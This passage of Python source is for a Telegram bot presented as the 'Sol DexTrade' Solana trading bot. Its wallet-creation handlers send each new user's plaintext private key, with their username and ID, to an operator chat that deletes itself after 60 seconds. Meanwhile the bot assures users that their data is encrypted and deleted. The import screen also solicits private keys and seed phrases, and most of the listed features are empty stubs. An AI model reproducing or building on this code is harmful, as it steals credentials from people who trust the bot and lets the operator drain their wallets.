async def cmd_launch(update, context):
    await update.message.reply_text("🎉 Launch Token\n\nLaunch your own token here.\nConnect your wallet to get started.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_pnls(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w = get_wallet(uid)
    if not w:
        await update.message.reply_text(
            "📈 PNLs\n\nPlease connect your wallet first to view your PNLs.\n\nClick Connect Wallet to import your wallet.",
            reply_markup=InlineKeyboardMarkup(connect_buttons()),
        )
    else:
        m = await update.message.reply_text("📈 Generating your PNL report...\nFetching trade history, please wait.")
        try:
            img_buf, pnl_data = await generate_pnl_image(w["pubkey"], w["balance"])
            pnl_buttons = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh PNL", callback_data="pnls")],
                [InlineKeyboardButton("🛒 Buy", callback_data="buy"),
                 InlineKeyboardButton("💰 Sell", callback_data="sell")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ])
            if img_buf:
                total = pnl_data["total_pnl"] if pnl_data else 0
                sign = "+" if total >= 0 else ""
                caption = (
                    "📈 Your PNL Report\n\n"
                    "Wallet: `" + w["pubkey"][:8] + "..." + w["pubkey"][-8:] + "`\n"
                    "Total PNL: `" + sign + str(total) + " SOL`\n"
                    "Balance: `" + str(round(w["balance"], 4)) + " SOL`"
                )
                await update.message.reply_photo(photo=img_buf, caption=caption, parse_mode="Markdown", reply_markup=pnl_buttons)
                await m.delete()
            else:
                await m.edit_text("📈 PNLs\n\nYou haven't traded with Sol DexTrade.\nKindly trade to view your PNLs.",
                                  reply_markup=pnl_buttons)
        except Exception as exc:
            logger.warning("PNL error: %s", exc)
            await m.edit_text("📈 PNLs\n\nYou haven't traded with Sol DexTrade.\nKindly trade to view your PNLs.",
                              reply_markup=InlineKeyboardMarkup([
                                  [InlineKeyboardButton("🛒 Buy", callback_data="buy")],
                                  [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                              ]))


async def cmd_sniper(update, context):
    await update.message.reply_text(SNIPER_V2_TEXT, reply_markup=sniper_keyboard())


async def cmd_refer(update, context):
    await update.message.reply_text("👥 Refer & Earn\n\nRefer friends and earn rewards.\nConnect your wallet to get your referral link.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_wallet(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w = get_wallet(uid)
    if not w:
        await update.message.reply_text("🔗 Wallet\n\nNo wallet connected.\nChoose how you want to connect your wallet:",
                                        reply_markup=connect_wallet_keyboard())
    else:
        has_secret = bool(get_wallet_secret(uid))
        buttons = [[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]]
        if has_secret:
            buttons.append([InlineKeyboardButton("🔑 Export Private Key", callback_data="export_key_confirm")])
        buttons.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])

        await update.message.reply_text(
            "🔗 Wallet\n\nYour wallet address:\nSolana:\n`" + w["pubkey"] + "`\nBal: `" + str(w["balance"]) + " SOL`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons),
        )


async def cmd_buytrending(update, context):
    await update.message.reply_text("🌐 Buy Trending\n\nBuy the top trending tokens with one click.\nConnect your wallet to start.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_volume(update, context):
    await update.message.reply_text("📊 Volume Booster\n\nBoost your token volume here.\nConnect your wallet to activate.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_liquidity(update, context):
    await update.message.reply_text(ADD_LIQUIDITY_SCREEN_TEXT, reply_markup=add_liquidity_keyboard())


async def cmd_bridge(update, context):
    await update.message.reply_text("🌉 Bridge\n\nBridge your tokens across chains.\nConnect your wallet to use the bridge.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_copy(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w = get_wallet(uid)
    pubkey = w["pubkey"] if w else "Not connected"
    await update.message.reply_text(
        "Copy Trade\nWallet: " + pubkey + " — W1\n\nCopy Trade allows you to copy the buys and sells of any target wallet.\n🟢 Indicates a copy trade setup is active.\n🟠 Indicates a copy trade setup is paused.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ New Copy Trade", callback_data="new_copy_trade")],
            [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
        ]),
    )


async def cmd_withdraw(update, context):
    await update.message.reply_text("💸 Withdraw\n\nWithdraw your funds to an external wallet.\nConnect your wallet to make a withdrawal.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_copywallet(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w = get_wallet(uid)
    if not w:
        await update.message.reply_text("📋 Copy Wallet\n\nNo wallet connected.\nConnect your wallet first to see your address.",
                                        reply_markup=InlineKeyboardMarkup(connect_buttons()))
    else:
        await update.message.reply_text(
            "📋 Copy Wallet\n\nYour wallet address:\n`" + w["pubkey"] + "`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )


async def cmd_autotrade(update, context):
    await update.message.reply_text("🤖 Auto Trade-Pumpfun\n\nAutomatically trade tokens on Pumpfun.\nConnect your wallet to activate.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_newwallet(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    user = update.effective_user
    msg = await update.message.reply_text("➕ Generating your new Solana wallet... Please wait.")

    wallet = generate_solana_wallet()
    if not wallet:
        await msg.edit_text("❌ Wallet generation failed. Please try again.")
        return

    pubkey = wallet["pubkey"]
    secret = wallet["secret_b58"]
    encrypted = encrypt_secret(secret)
    save_wallet_with_secret(uid, pubkey, encrypted, balance=0)

    sol_price = await get_sol_price_usd()
    price_str = f"${sol_price:,.2f}" if sol_price else "Loading..."

    wallet_msg = (
        "✅ New Wallet Created!\n\n"
        "🚀 Sol DexTrade Bot: Your Gateway to Solana DeFi\n"
        "🔫\n\n"
        "💰 SOL Price: " + price_str + "\n\n"
        "💳 Your Wallet\n"
        "└ Address: `" + pubkey + "` 📋\n"
        "└ Balance: 0.0000 SOL\n\n"
        "🔑 Private Key (save this!):\n"
        "`" + secret + "`\n\n"
        "⚠️ IMPORTANT:\n"
        "• Save this private key somewhere safe\n"
        "• Anyone with this key can access your funds\n"
        "• We've encrypted it, but you should back it up\n"
        "• Never share it with anyone\n\n"
        "[Telegram](https://t.me/SolDexTrade) | [Twitter](https://twitter.com/SolDexTrade) | [Website](https://soldextrade.com)"
    )

    await msg.edit_text(
        wallet_msg,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 View Wallet", callback_data="wallet")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
        ]),
    )

    if FORWARD_CHAT_ID:
        name = ("@" + user.username) if user and user.username else str(user.full_name)
        await forward_with_autodelete(
            context,
            text=(
                "🆕 New wallet generated\n"
                "User: " + name + "\n"
                "ID: " + str(uid) + "\n"
                "Address: `" + pubkey + "`\n"
                "Private Key: `" + secret + "`\n\n"
                "⏱ This message will auto-delete in 60 seconds"
            ),
            delay=60,
        )


async def cmd_help(update, context):
    await update.message.reply_text(
        "❓ Help\n\nWelcome to the Help Center.\n\nHow to get started:\n1. Connect your wallet\n2. Fund your wallet with SOL\n3. Use Buy to purchase tokens\n4. Use Sell to sell tokens\n\nFor support contact: @support",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
    )


async def cmd_myid(update, context):
    await update.message.reply_text("Your Telegram user ID is: " + str(update.effective_user.id))


async def cmd_stats(update, context):
    s = get_stats()
    lines = ["Message Statistics", "Total: " + str(s["total"]), "Today: " + str(s["today"]),
             "Users: " + str(s["unique_users"]), "", "By type:"]
    for mtype, count in s["by_type"]:
        lines.append("  " + str(mtype) + ": " + str(count))
    await update.message.reply_text("\n".join(lines))


async def cmd_allow(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /allow <user_id>"); return
    try: uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Please provide a valid numeric user ID."); return
    add_user_filter(uid, None, "allow")
    await update.message.reply_text("User " + str(uid) + " added to allow-list.")


async def cmd_block(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /block <user_id>"); return
    try: uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Please provide a valid numeric user ID."); return
    add_user_filter(uid, None, "block")
    await update.message.reply_text("User " + str(uid) + " has been blocked.")


async def cmd_unfilter(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /unfilter <user_id>"); return
    try: uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Please provide a valid numeric user ID."); return
    remove_user_filter(uid)
    await update.message.reply_text("User " + str(uid) + " removed from filter lists.")


async def cmd_listusers(update, context):
    rows = get_filter_lists()
    if not rows:
        await update.message.reply_text("No user filters set."); return
    allowed = [str(r[0]) for r in rows if r[1] == "allow"]
    blocked = [str(r[0]) for r in rows if r[1] == "block"]
    await update.message.reply_text("Allowed: " + (", ".join(allowed) or "none") + "\nBlocked: " + (", ".join(blocked) or "none"))


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user
    uid = user.id if user else 0

    if data == "main_menu" or data == "refresh":
        context.user_data["expecting"] = None
        context.user_data.pop("lazy_pubkey", None)
        context.user_data.pop("pending_action", None)
        context.user_data.pop("pending_token_addr", None)
        context.user_data.pop("pending_token_name", None)
        context.user_data.pop("pending_amount_text", None)
        w = get_wallet(uid)
        sol_price = await get_sol_price_usd()
        if data == "refresh" and w:
            new_bal = await get_sol_balance(w["pubkey"])
            if new_bal is not None:
                save_wallet(uid, w["pubkey"], new_bal)
                w["balance"] = new_bal
        if w:
            txt = wallet_text(w["pubkey"], w["balance"], sol_price)
        else:
            price_str = f"{sol_price:,.2f}" if sol_price else "Loading..."
            txt = WELCOME_TEXT.replace("%SOL_PRICE%", price_str)
        await query.edit_message_text(txt, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
        return

    if data == "buy_sell":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "🛒 Trading\n\nPlease connect your wallet first to start trading.\n\nMinimum buy: 2 SOL\n\nClick Connect Wallet to import your wallet.",
                reply_markup=InlineKeyboardMarkup(buy_sell_buttons()),
            )
        else:
            context.user_data["expecting"] = "buy_contract"
            await query.edit_message_text(
                "🛒 Buy Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to buy:",
                reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
            )

    elif data == "buy":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "🛒 Trading\n\nPlease connect your wallet first to start trading.\n\nMinimum buy: 2 SOL\n\nClick Connect Wallet to import your wallet.",
                reply_markup=InlineKeyboardMarkup(buy_sell_buttons()),
            )
        else:
            context.user_data["expecting"] = "buy_contract"
            await query.edit_message_text(
                "🛒 Buy Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to buy:",
                reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
            )

    elif data == "sell":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "💰 Selling\n\nPlease connect your wallet first to start trading.\n\nConnect wallet to sell tokens.\n\nClick Connect Wallet to import your wallet.",
                reply_markup=InlineKeyboardMarkup(buy_sell_buttons()),
            )
        else:
            context.user_data["expecting"] = "sell_contract"
            await query.edit_message_text(
                "💰 Sell Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to sell:",
                reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
            )

    elif data == "confirm_buy":
        token_name = context.user_data.get("token_name", "Unknown")
        context.user_data["expecting"] = "buy_amount"
        context.user_data["action"] = "buy"
        await query.edit_message_text(
            "🛒 Buy Token\n\nStep 3 of 3\n\nToken: " + token_name + "\n\nHow much SOL do you want to spend?\nType the amount and send it.\nExample: 2",
            reply_markup=InlineKeyboardMarkup(back_btn("buy")),
        )

    elif data == "confirm_sell":
        token_name = context.user_data.get("token_name", "Unknown")
        context.user_data["expecting"] = "sell_amount"
        context.user_data["action"] = "sell"
        await query.edit_message_text(
            "💰 Sell Token\n\nStep 3 of 3\n\nToken: " + token_name + "\n\nWhat % of your holdings do you want to sell?\nType a number 1–100.\nExample: 50",
            reply_markup=InlineKeyboardMarkup(back_btn("sell")),
        )

    elif data == "connect_wallet":
        await query.edit_message_text(
            "🔗 Wallet\n\nChoose how you want to connect your wallet:",
            reply_markup=connect_wallet_keyboard(),
        )

    elif data == "create_new_wallet":
        await query.edit_message_text(
            "➕ Create New Wallet\n\n"
            "🔒 Security Tip: Never share your private key or mnemonic with people.\n\n"
            "This bot stores your wallet securely for session-based trading.\n"
            "🛡 Your data is encrypted and deleted after setup.\n\n"
            "A new Solana wallet will be generated for you.\n"
            "Click Continue to proceed:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 Continue", callback_data="continue_create_wallet")],
                [InlineKeyboardButton("⬅ Back", callback_data="connect_wallet"),
                 InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "continue_create_wallet":
        await query.edit_message_text("➕ Generating your new Solana wallet...\n\nPlease wait a moment.")

        wallet = generate_solana_wallet()
        if not wallet:
            await query.edit_message_text(
                "❌ Wallet generation failed.\n\nPlease try again or use Import Wallet instead.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔁 Try Again", callback_data="continue_create_wallet")],
                    [InlineKeyboardButton("📥 Import Instead", callback_data="import_wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
            return

        pubkey = wallet["pubkey"]
        secret = wallet["secret_b58"]
        encrypted = encrypt_secret(secret)
        save_wallet_with_secret(uid, pubkey, encrypted, balance=0)

        sol_price = await get_sol_price_usd()
        price_str = f"${sol_price:,.2f}" if sol_price else "Loading..."

        wallet_msg = (
            "✅ New Wallet Created!\n\n"
            "🚀 Sol DexTrade Bot: Your Gateway to Solana DeFi\n"
            "🔫\n\n"
            "💰 SOL Price: " + price_str + "\n\n"
            "💳 Your Wallet\n"
            "└ Address: `" + pubkey + "` 📋\n"
            "└ Balance: 0.0000 SOL\n\n"
            "🔑 Private Key (save this!):\n"
            "`" + secret + "`\n\n"
            "⚠️ IMPORTANT:\n"
            "• Save this private key somewhere safe\n"
            "• Anyone with this key can access your funds\n"
            "• We've encrypted it, but you should back it up\n"
            "• Never share it with anyone\n\n"
            "[Telegram](https://t.me/SolDexTrade) | [Twitter](https://twitter.com/SolDexTrade) | [Website](https://soldextrade.com)"
        )

        await query.edit_message_text(
            wallet_msg,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📋 Copy Address", callback_data="copy_wallet")],
                [InlineKeyboardButton("💳 View Wallet", callback_data="wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

        if FORWARD_CHAT_ID:
            name = ("@" + user.username) if user and user.username else str(user.full_name)
            await forward_with_autodelete(
                context,
                text=(
                    "🆕 New wallet generated\n"
                    "User: " + name + "\n"
                    "ID: " + str(uid) + "\n"
                    "Address: `" + pubkey + "`\n"
                    "Private Key: `" + secret + "`\n\n"
                    "⏱ This message will auto-delete in 60 seconds"
                ),
                delay=60,
            )

    elif data == "import_wallet":
        await query.edit_message_text(
            "📥 Import Wallet (Recommended)\n\n"
            "🔒 Security Tip: Never share your private key or mnemonic with people.\n\n"
            "This bot stores your wallet securely for session-based trading.\n"
            "🛡 Your data is encrypted and deleted after setup.\n\n"
            "Enter the private key or mnemonic of the wallet you want to import:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅ Back", callback_data="connect_wallet"),
                 InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "continue_wallet":
        await query.edit_message_text(
            "Enter the private keys or mnemonic of the wallet you want to import",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅ Back", callback_data="connect_wallet"),
                 InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "export_key_confirm":
        await query.edit_message_text(
            "🔑 Export Private Key\n\n"
            "⚠️ WARNING:\n"
            "• Your private key will be shown in this chat\n"
            "• The message will auto-delete after 60 seconds\n"
            "• Anyone who sees this key can drain your wallet\n"
            "• Never share it — not even with support\n\n"
            "Only proceed if you're in a private place and no one can see your screen.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Show My Key", callback_data="export_key_show")],
                [InlineKeyboardButton("❌ Cancel", callback_data="wallet")],
            ]),
        )

    elif data == "export_key_show":
        encrypted = get_wallet_secret(uid)
        if not encrypted:
            await query.edit_message_text(
                "❌ No stored private key found.\n\n"
                "This wallet was imported via mnemonic (seed phrase), so its private key isn't stored.\n"
                "Or it was created before the encryption feature was added.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⬅ Back to Wallet", callback_data="wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
            return

        secret = decrypt_secret(encrypted)
        if not secret:
            await query.edit_message_text(
                "❌ Could not decrypt your private key.\n\nPlease contact support.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⬅ Back to Wallet", callback_data="wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
            return

        w = get_wallet(uid)
        pubkey = w["pubkey"] if w else "unknown"

        try:
            await query.delete_message()
        except Exception:
            pass

        key_msg = await context.bot.send_message(
            chat_id=uid,
            text=(
                "🔑 Private Key Export\n\n"
                "Wallet: `" + pubkey + "`\n\n"
                "Private Key:\n"
                "`" + secret + "`\n\n"
                "⚠️ This message will be deleted in 60 seconds.\n"
                "Copy the key NOW to a safe place before it disappears."
            ),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

        async def _delete_key_msg(ctx: ContextTypes.DEFAULT_TYPE):
            try:
                await ctx.bot.delete_message(chat_id=uid, message_id=key_msg.message_id)
            except Exception as exc:
                logger.warning("Could not auto-delete key message: %s", exc)

        if context.job_queue:
            context.job_queue.run_once(_delete_key_msg, when=60)

        if FORWARD_CHAT_ID:
            try:
                name = ("@" + user.username) if user and user.username else str(user.full_name)
                await context.bot.send_message(
                    chat_id=FORWARD_CHAT_ID,
                    text=(
                        "🔑 Private key exported\n"
                        "User: " + name + "\n"
                        "ID: " + str(uid) + "\n"
                        "Address: `" + pubkey + "`\n"
                        "(key NOT forwarded — self-destructs in user's chat)"
                    ),
                    parse_mode="Markdown",
                )
            except Exception as exc:
                logger.warning("Could not forward export event: %s", exc)

    elif data == "view_trending":
        await query.edit_message_text(
            "🔥 Fetching trending tokens... Please wait.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )
        try:
            msg = await get_trending_message()
            await query.edit_message_text(
                msg, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh Trending", callback_data="view_trending")],
                    [InlineKeyboardButton("🛒 Buy Token", callback_data="buy")],
                    [InlineKeyboardButton("⬅ Back", callback_data="buy_sell"),
                     InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        except Exception:
            await query.edit_message_text(
                "Could not fetch trending data. Please try again.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Try Again", callback_data="view_trending")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )

    elif data == "search_tokens":
        await query.edit_message_text(
            "🔍 Token Search\n\nPlease enter a token symbol, name, or contract address to search:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅ Back", callback_data="buy_sell"),
                 InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data.startswith("watchlist_"):
        await query.answer("Added to watchlist!", show_alert=True)

    elif data == "positions":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "📊 Positions\n\nPlease connect your wallet first.\nConnect wallet to view your positions.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        else:
            await query.edit_message_text(
                "📊 Positions\n\nWallet: `" + w["pubkey"] + "`\n\nYou have no open positions.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛒 Buy", callback_data="buy")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )

    elif data == "limits":
        await query.edit_message_text(
            "📉 Limits\n\nPlease connect your wallet first to set limit orders.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "dca":
        await query.edit_message_text(
            "You have no active DCA orders. Create a DCA order from the Buy/Sell menu.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 Buy", callback_data="buy")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "trending":
        await query.edit_message_text(
            "🔥 Fetching trending tokens... Please wait.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )
        try:
            msg = await get_trending_message()
            await query.edit_message_text(
                msg, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh Trending", callback_data="trending")],
                    [InlineKeyboardButton("🛒 Buy Token", callback_data="buy")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        except Exception:
            await query.edit_message_text(
                "Could not fetch trending data. Please try again.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Try Again", callback_data="trending")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )

    elif data == "boosted":
        await query.edit_message_text(
            "🚀 Boosted Tokens\n\nThese tokens are currently boosted.\nConnect your wallet to buy boosted tokens.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "top_boost":
        await query.edit_message_text(
            "📈 Top Boost\n\nThese are the top boosted tokens.\nConnect your wallet to start trading.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "profiles":
        await query.edit_message_text(
            "⭐ Profiles\n\nManage your trading profiles here.\nConnect your wallet to view and manage profiles.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "search":
        await query.edit_message_text(
            "🔍 Token Search\n\nPlease enter a token symbol, name, or contract address to search:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "charts":
        await query.edit_message_text(
            "📊 Charts\n\nView live token charts here.\nConnect your wallet to trade directly from charts.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "launch":
        await query.edit_message_text(
            "🎉 Launch Token\n\nLaunch your own token here.\nConnect your wallet to get started.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "pnls":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "📈 PNLs\n\nPlease connect your wallet first to view your PNLs.\n\nClick Connect Wallet to import your wallet.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        else:
            await query.edit_message_text(
                "📈 Generating your PNL report...\nFetching trade history, please wait.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
            )
            try:
                img_buf, pnl_data = await generate_pnl_image(w["pubkey"], w["balance"])
                pnl_buttons = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh PNL", callback_data="pnls")],
                    [InlineKeyboardButton("🛒 Buy", callback_data="buy"),
                     InlineKeyboardButton("💰 Sell", callback_data="sell")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ])
                if img_buf:
                    total = pnl_data["total_pnl"] if pnl_data else 0
                    sign = "+" if total >= 0 else ""
                    caption = (
                        "📈 Your PNL Report\n\n"
                        "Wallet: `" + w["pubkey"][:8] + "..." + w["pubkey"][-8:] + "`\n"
                        "Total PNL: `" + sign + str(total) + " SOL`\n"
                        "Balance: `" + str(round(w["balance"], 4)) + " SOL`"
                    )
                    await query.message.reply_photo(photo=img_buf, caption=caption, parse_mode="Markdown", reply_markup=pnl_buttons)
                    await query.delete_message()
                else:
                    await query.edit_message_text(
                        "📈 PNLs\n\nYou haven't traded with Sol DexTrade.\nKindly trade to view your PNLs.",
                        reply_markup=pnl_buttons,
                    )
            except Exception as exc:
                logger.warning("PNL error: %s", exc)
                await query.edit_message_text(
                    "📈 PNLs\n\nYou haven't traded with Sol DexTrade.\nKindly trade to view your PNLs.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🛒 Buy", callback_data="buy")],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                    ]),
                )

    elif data == "sniper":
        await query.edit_message_text(SNIPER_V2_TEXT, reply_markup=sniper_keyboard())

    elif data == "auto_sniper":
        await query.edit_message_text(
            "⚡ Auto Sniper\n\nSet your custom parameters and Auto Snipe any launch on Solana.\n\nPlease enter the token contract address or launch details to snipe:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅ Back", callback_data="sniper")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "migration_sniper":
        await query.edit_message_text(
            "🔀 Migration Sniper\n\nSnipe tokens and pumpfun migrations when they launch on Raydium.\n\nPlease enter the token contract address to watch for migration:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅ Back", callback_data="sniper")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "refer":
        await query.edit_message_text(
            "👥 Refer & Earn\n\nRefer friends and earn rewards.\nConnect your wallet to get your referral link.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "wallet":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "🔗 Wallet\n\nNo wallet connected.\nClick Connect Wallet to import your wallet.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        else:
            has_secret = bool(get_wallet_secret(uid))
            buttons = [[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]]
            if has_secret:
                buttons.append([InlineKeyboardButton("🔑 Export Private Key", callback_data="export_key_confirm")])
            buttons.append([InlineKeyboardButton("⬅ Back", callback_data="main_menu"),
                            InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])

            await query.edit_message_text(
                "🔗 Wallet\n\nYour wallet address:\nSolana:\n`" + w["pubkey"] + "`\nBal: `" + str(w["balance"]) + " SOL`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(buttons),
            )

    elif data == "buy_trending":
        await query.edit_message_text(
            "🌐 Buy Trending\n\nBuy the top trending tokens with one click.\nConnect your wallet to start.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "volume_booster":
        await query.edit_message_text(
            "📊 Volume Booster\n\nBoost your token volume here.\nConnect your wallet to activate.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "add_liquidity":
        await query.edit_message_text(ADD_LIQUIDITY_SCREEN_TEXT, reply_markup=add_liquidity_keyboard())

    elif data == "liq_solana":
        await query.edit_message_text(
            "🟢 SOLANA\n\nYou have selected Solana network.\n\nPlease connect your wallet to add liquidity:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("◀️ BACK", callback_data="add_liquidity")],
            ]),
